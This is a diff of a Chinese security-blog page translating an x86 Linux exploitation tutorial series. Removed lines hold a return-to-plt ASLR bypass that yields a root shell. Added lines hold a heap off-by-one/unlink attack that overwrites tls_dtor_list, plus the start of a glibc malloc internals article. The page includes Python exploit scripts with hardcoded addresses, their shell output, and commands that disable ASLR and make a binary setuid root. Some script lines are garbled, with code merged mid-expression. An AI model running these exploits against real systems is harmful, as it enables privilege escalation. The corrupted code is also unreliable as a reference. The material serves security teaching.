class="number">0x80485a0</span>,(%esp)</div><div class="line"> <span class="number">0x08048481</span> &lt;+<span class="number">13</span>&gt;: call <span class="number">0x8048380</span> &lt;system@plt&gt;</div><div class="line"> <span class="number">0x08048486</span> &lt;+<span class="number">18</span>&gt;: movl $<span class="number">0x0</span>,(%esp)</div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">exit</span>@plt&gt;</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>利用这些地址，我们就可以写出绕过ASLR(与NX)的漏洞利用代码！</p>
-<p><u>漏洞利用代码</u>：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">system = 0x8048380</div><div class="line">exit = 0x80483a0</div><div class="line">system_arg = 0x80485b5     #Obtained from hexdump output of executable 'vuln'</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 272</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
-<p>执行上述程序就可以获取root shell，如下所示：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
-<p><u>注意</u>： 为了获取这个root shell，可执行文件必须包含’system@PLT’与’exit@PLT’代码。在<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇</a>中，我会谈谈利用GOT覆盖与GOT解引用技术，在可执行文件中并没有需要的PLT存根代码并且系统已经打开了ASLR的情况下，攻击者如何调用libc函数。 </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -o consolidate_forward consolidate_forward.c</div><div class="line">$sudo chown root consolidate_forward</div><div class="line">$sudo chgrp root consolidate_forward</div><div class="line">$sudo chmod +s consolidate_forward</div></pre></td></tr></table></figure>
+<p><u>注意</u>: 为了更好演示，已经关闭ASLR。如果你也想绕过ASLR，可以利用<a href="http://www.csyssec.org/20170104/useafterfree/" target="_blank" rel="external">这篇文章</a>提到的信息泄露漏洞或暴力破解技术<br>。</p>
+<p><strong>注：本系列所有文章中第[N]行代码指的的代码中显示/*[N]*/的位置。</strong></p>
+<p>上述漏洞程序的第[2]和[8]行就是堆中off-by-one溢出可能发生的地方。目的缓冲区的长度是1020，因此源缓冲区长度也是1020的话就会导致任意代码执行。</p>
+<h3 id="0X02-如何做到任意代码执行"><a href="#0X02-如何做到任意代码执行" class="headerlink" title="0X02 如何做到任意代码执行"></a>0X02 如何做到任意代码执行</h3><p>当单NULL字节覆盖下一个chunk(‘p3’)的chunk头部信息时就会发生任意代码执行。当1020字节的chunk(‘p2’)被单字节溢出时，是下一个chunk(‘p3’)头部大小的最小影响字节(Least Significant Byte)-(而不是prev_size的最小影响字节)被NULL字节覆盖。</p>
+<h3 id="0X03-为什么不是prev-size的最小影响字节-LSB-被覆盖"><a href="#0X03-为什么不是prev-size的最小影响字节-LSB-被覆盖" class="headerlink" title="0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖"></a>0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖</h3><p>由于需要额外的空间来存储malloc_chunk以及为了对其的目的，<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1254" target="_blank" rel="external">checked_request2size</a>将用户需求的大小转化为可用的大小(内部表示字节大小-internal representation size)。当可用大小的最后3个比特都没有被设置时会发生这种转化，这3个比特用来存储flag信息 P,M与N。</p>
+<p>上漏洞代码执行到malloc(1020)时，1020字节的用户需求大小被转化为((1020 + 4 + 7) &amp; ~7) 1024字节(内部表示字节大小)。分配1020字节的chunk开销只要4字节。但对于一个分配的chunk我们却需要8字节的chunk头部信息用来存储prev_size和size信息。1024字节的chunk前8个字节用作chunk头部信息，但现在只剩下1016（1024-8）字节（而不是1020字节)用来存储用户数据。如上面说的prev_size的定义，如果前一个chunk(‘p2’)被分配，chunk(‘p3’)的prev_size域含有用户数据。chunk(‘p3’)的prev_size紧邻已经分配的chunk(‘p2’)，其含有用户数据剩下的4字节。这就是为什么size(而不是pre_size)的LSB被但NULL字节覆盖的原因了。</p>
+<p><u>堆布局</u>:</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoffbyone1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoffbyone1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p><u>注意</u>: 上图中的攻击者数据指的是下文中提到的”覆盖 tls_dtor_list”</p>
+<p>现在回到我们一开始的问题</p>
+<pre><code>如何做到任意代码执行
+</code></pre><p>现在我们已经知道在off-by-one漏洞中，单NULL字节覆盖下一个chunk(‘p3’) size域的LSB。单NULL字节覆盖意味着chunk(‘p3’)的flag信息被清除了。 被覆盖的chunk(‘p2’)尽管处于已经被分配的状态，现在却变得空闲了。当在溢出的chunk (‘p2)前的(‘p’)被释放时，这种状态不一致性驱使glibc去unlink 已经处于分配状态的chunk(‘p2’)  </p>
+<p>在<a href="http://www.csyssec.org/20170104/heapoverflow-unlink/" target="_blank" rel="external">这篇</a>文章中，由于任何四字节的内存区域都能被写上攻击者的数据，unlink一个已经在分配状态的chunk会导致任意代码执行<br>！！ 在同一篇文中，我们也知道由于glibc近些年的被强化，unlink技术已经过时了！ 尤其是当<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1414" target="_blank" rel="external">“损坏的双链表”</a>这个条件成立时，任意代码执行是不可能的。</p>
+<p>在2014年后期，<a href="http://googleprojectzero.blogspot.in/2014/08/the-poisoned-nul-byte-2014-edition.html" target="_blank" rel="external"> google’s project zero team</a>发现一种通过unlink一个大的chunk(large chunk)的方法，可以成功绕过”损坏的双链表”条件。</p>
+<p><u>Unlink</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123; </span></div><div class="line">  FD = P-&gt;fd; </div><div class="line">  BK = P-&gt;bk;</div><div class="line">  <span class="comment">// Primary circular double linked list hardening - Run time check</span></div><div class="line">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) <span class="comment">/* [1] */</span></div><div class="line">   malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P); </div><div class="line">  <span class="keyword">else</span> &#123; </div><div class="line">   <span class="comment">// If we have bypassed primary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!</span></div><div class="line">   FD-&gt;bk = BK; <span class="comment">/* [2] */</span></div><div class="line">   BK-&gt;fd = FD; <span class="comment">/* [3] */</span></div><div class="line">   <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size) </div><div class="line">   &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123; </div><div class="line">    <span class="comment">// Secondary circular double linked list hardening - Debug assert</span></div><div class="line">    assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);  <span class="comment">/* [4] */</span></div><div class="line">        assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P); <span class="comment">/* [5] */</span></div><div class="line">    <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123; </div><div class="line">     <span class="keyword">if</span> (P-&gt;fd_nextsize == P) </div><div class="line">      FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; </div><div class="line">     <span class="keyword">else</span> &#123; </div><div class="line">      FD-&gt;fd_nextsize = P-&gt;fd_nextsize; </div><div class="line">      FD-&gt;bk_nextsize = P-&gt;bk_nextsize; </div><div class="line">      P-&gt;fd_nextsize-&gt;bk_nextsize = FD; </div><div class="line">      P-&gt;bk_nextsize-&gt;fd_nextsize = FD; </div><div class="line">     &#125; </div><div class="line">    &#125; <span class="keyword">else</span> &#123; </div><div class="line">     <span class="comment">// If we have bypassed secondary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!</span></div><div class="line">     P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; <span class="comment">/* [6] */</span></div><div class="line">     P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; <span class="comment">/* [7] */</span></div><div class="line">    &#125; </div><div class="line">   &#125; </div><div class="line">  &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在glibc malloc中，主环形双链表由malloc_chunk的fs和bk域来维护，而次环形双链表由malloc_chunk的fd_nextsize和bk_nextsize域来维护。这看起来像是损坏的双链表hardening被应用到了主环形双链表(第[1]行)和次环形双链表中(第[4],[5]行)，但次要环形双链表的hardening仅仅是一个debug assert语句(不像是主环形双链表hardening会在运行时进行检查)，它最终并不会编译到产品中(至少在fedora是这样的)。次要环形双链表的强化(hardening)（第[4],[5]行)并没有什么意义，这可以让我们在4字节的内存区域中写任何数据(第[6],[7]行)。</p>
+<p>任然还有一些东西要讲明白一些。我们来看看如何通过unlink一个大的chunk来做到任意代码执行的细节！ 现在攻击者已经控制住即将要被释放的大chunk，他以下方式覆盖malloc_chunk中的域：</p>
+<ul>
+<li>fd必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>bk也必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>fd_nextsize 必须指向 free_got_addr -0x14</li>
+<li>bk_nextsize 必须指向system_addr</li>
+</ul>
+<p>但第[6],[7]行需要fd_nextsize和bk_nextsize是可写的。fd_nextsize指向 free_got_addr -0x14，所以它是可写的。但bk_nextsize指向system_addr，这属于libc.so的text段区域，所以它是不可写的。要让fd_nextsize和bk_nextsize同时可写，需要覆盖tls_dtor_list</p>
+<h3 id="0X04-覆盖tls-dtor-list"><a href="#0X04-覆盖tls-dtor-list" class="headerlink" title="0X04 覆盖tls_dtor_list"></a>0X04 覆盖tls_dtor_list</h3><p><a href="">tls_dtor_list</a>是一个线程本地变量，含有一个函数指针列表，在执行exit()时会被调用。 <a href=""> __call_tls_dtors]()遍历tls_dtor_list并一个一个调用其中的函数！！ 所以如果我们能利用一个含有system和system_arg的堆地址覆盖tls_dtor_list，来替换dtor_list</a>中的func和obj， system()就能被调用。</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoffbyone2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoffbyone2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>现在攻击者通过以下方式覆盖即将要释放的大chunk中的malloc_chunk里面的域信息：</p>
+<ul>
+<li>fd必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>bk也必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>fd_nextsize 必须指向 tls_dtor_list -0x14</li>
+<li>bk_nextsize 必须指向含有dtor_list元素的堆地址</li>
+</ul>
+<p>让fd_nextsize变成可写的问题解决了。那是因为tls_dtor_list属于libc.so的可写段，并且通过反汇编_call_tls_dtors()，可以得到tls_dtor_list的地址是0xb7fe86d4</p>
+<p>由于bk_nextsize指向堆地址，让它变成可写的问题也解决了。</p>
+<p>利用所有这些信息，我们可以写个漏洞利用程序来攻击’consolidate_forward’了！！</p>
+<p><u>漏洞利用代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#exp_try.py</div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">fd = <span class="number">0x0804b418</span></div><div class="line">bk = <span class="number">0x0804b418</span></div><div class="line">fd_nextsize = <span class="number">0xb7fe86c0</span></div><div class="line">bk_nextsize = <span class="number">0x804b430</span></div><div class="line">system = <span class="number">0x4e0a86e0</span></div><div class="line">sh = <span class="number">0x80482ce</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,num(fd)</div><div class="line">buf += conv(bk)</div><div class="line">buf += conv(fd_nextsize)</div><div class="line">buf += conv(bk_nextsize)</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(sh)</div><div class="line">buf += <span class="string">"A"</span> * <span class="number">996</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./consolidate_forward"</span>, buf])</div></pre></td></tr></table></figure>
+<p>执行上述漏洞利用代码，并不能给我们root shell。它只能提供运行在我们自己权限上的bash shell。 </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python -c 'print "A"*16' &gt; inp_file</div><div class="line">$ python exp_try.py </div><div class="line">Calling vulnerable program</div><div class="line">sh-4.2$ id</div><div class="line">uid=1000(sploitfun) gid=1000(sploitfun) groups=1000(sploitfun),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</div><div class="line">sh-4.2$ exit</div><div class="line">exit</div><div class="line">$</div></pre></td></tr></table></figure>
+<h3 id="0X05-为什么没能获取root-shell"><a href="#0X05-为什么没能获取root-shell" class="headerlink" title="0X05 为什么没能获取root shell"></a>0X05 为什么没能获取root shell</h3><p>当uid!=euid时，/bin/bash会丢弃权限。我们的二进制文件’consolidate _forward’的真实uid=1000，有效uid=0。 由于真实uid!=有效uid，因此当system() 被调用时，bash会丢弃权限。为了解决这个问题，我们需要在执行system()之前调用setuid(0)，由于_call_tls_dtors遍历tls_dtor_list并一个一个调用其中的函数，我们需要链接setuid()和system()</p>
 <hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heap-offbyone" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
 
       
     </div>
@@ -557,7 +223,581 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
 
       
   <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap/">Heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-glibcmalloc"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170104/glibcmalloc/">深入理解glibc malloc</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170104/glibcmalloc/" class="article-date">
+	  <time datetime="2017-01-04T11:19:06.000Z" itemprop="datePublished">一月 4, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>译者： 资深工程师@Barret</p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/glibcmalloc" target="_blank" rel="external">Linux(X86)漏洞利用系列-深入理解glibc malloc)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 内存分配器</li>
+<li>0X02 多个堆</li>
+<li>0X03 Arena</li>
+<li>0X04 Chunk</li>
+<li>0X05 Bins</li>
+</ul>
+</blockquote>
+<p>我一直被堆内存的问题困扰着。比如说像这样的问题：</p>
+<pre><code>堆内存是如何从内核中分配的？
+内存管理效率如何？
+它是由内核、库函数还是应用本身管理？
+堆内存可以被利用吗？
+</code></pre><p>这几个问题困惑了我好久，直到最近我才有时间去了解它。所以接下来我就给大家谈谈我的研究成果。开源社区提供了很多现成的内存分配器：</p>
+<ul>
+<li>Dlmalloc – General purpose allocator</li>
+<li>Ptmalloc2 – glibc</li>
+<li>Jemalloc – FreeBSD and FireFox</li>
+<li>Tcmalloc – Google</li>
+<li>Libumem – Solaris</li>
+<li>…</li>
+</ul>
+<h3 id="0X01-内存分配器"><a href="#0X01-内存分配器" class="headerlink" title="0X01 内存分配器"></a>0X01 内存分配器</h3><p>每一种内存分配器都声称自己快速、可拓展、效率高！但是并不是所有的分配器都适用于我们的应用。内存吞吐量大的应用程序的性能很大程度上都取决于内存分配器的性能。在这篇文章中，我将只谈论“glibc malloc”这个内存分配器。以后我希望可以跟大家分享其它内存分配器的研究成果。为了让大家更好的理解‘glibc malloc’，我将给大家附上它的源代码的[链接]（<a href="https://sourceware.org/ml/libc-alpha/2014-09/msg00088.html）。接下来就让我们一起来学习下glibc" target="_blank" rel="external">https://sourceware.org/ml/libc-alpha/2014-09/msg00088.html）。接下来就让我们一起来学习下glibc</a> malloc吧！</p>
+<p><u>历史</u>：<a href="http://www.malloc.de/en/" target="_blank" rel="external">ptmalloc2</a>是基于<a href="http://g.oswego.edu/dl/html/malloc.html" target="_blank" rel="external">dlmalloc</a>开发的，另外它还添加了对多线程的支持，并于2006年公布。公布之后，ptmalloc2被整合到glibc源代码中去了，此后，所有的关于ptmalloc2的源代码的修改都是直接到glibc malloc中修改。因此，ptmalloc2的源码和glibc的malloc的源码有很多不一致的地方。</p>
+<p><strong>系统调用</strong>：正如在<a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">这篇</a>文章中看到的那样，malloc的内部调用为<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html" target="_blank" rel="external">brk</a>或<a href="http://man7.org/linux/man-pages/man2/mmap.2.html" target="_blank" rel="external">mmap</a>。</p>
+<p><strong>线程</strong>：Linux的早期版本都是使用dlmalloc作为默认的内存分配器，但是后来由于ptmalloc2提供了多线程支持，所以Linux后来又采用ptmalloc2作为默认内存分配器。多线程支持可以提升内存分配器的性能，进而可以提升应用的性能。在dlmalloc中，当有两个线程同时调用malloc时，只有一个线程能够访问临界区（critical section），因为空闲列表数据结构被所有可用线程共享。正是由于这个原因，dlmalloc在多线程应用中比较耗时，从而导致性能下降。而在ptmalloc2中，当有两个线程同时调用malloc时，均会立即得到内存分配，因为每个线程都维护着一个独立的堆段，，因此空闲列表数据结构维护的堆也是独立的。这种为每个线程独立的维护堆和空闲列表数据结构的行为称为<strong>per thread arena</strong>。</p>
+<p><u>例子</u>：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Per thread arena example. */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="built_in">free</span>(addr);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After free in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">pthread_t</span> t1;</div><div class="line">        <span class="keyword">void</span>* s;</div><div class="line">        <span class="keyword">int</span> ret;</div><div class="line">        <span class="keyword">char</span>* addr;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to per thread arena example::%d\n"</span>,getpid());</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="built_in">free</span>(addr);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After free in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</div><div class="line">        <span class="keyword">if</span>(ret)</div><div class="line">        &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Thread creation error\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        ret = pthread_join(t1, &amp;s);</div><div class="line">        <span class="keyword">if</span>(ret)</div><div class="line">        &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Thread join error\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>输出分析</u>：</p>
+<p>在主线程malloc之前：在如下的输出里我们可以看到，这里还没有堆段，也没有线程栈，因为thread1还没有被创建</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </div><div class="line">Welcome to per thread arena example::<span class="number">6501</span></div><div class="line">Before <span class="built_in">malloc</span> in main thread</div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line">b7e05000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</div></pre></td></tr></table></figure>
